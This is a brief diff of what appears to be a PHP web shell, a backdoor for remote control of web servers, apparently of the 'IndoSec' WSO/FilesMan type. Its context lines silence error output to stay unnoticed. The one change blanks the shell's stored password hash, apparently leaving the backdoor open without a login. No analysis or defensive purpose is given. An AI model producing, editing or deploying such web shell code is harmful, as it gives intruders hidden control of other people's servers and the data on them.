@@ -25,7 +25,7 @@ error_reporting(0);
 @ini_set('display_errors', 0);
 
 /* Configurasi */
-$aupas 			= "54062f3bf6377d42b4fab7c8fedfc7da";// IndoSec
+$aupas 			= "";// IndoSec
 $default_action 	= 'FilesMan';
 $default_use_ajax 	= true;
 $default_charset 	= 'UTF-8';
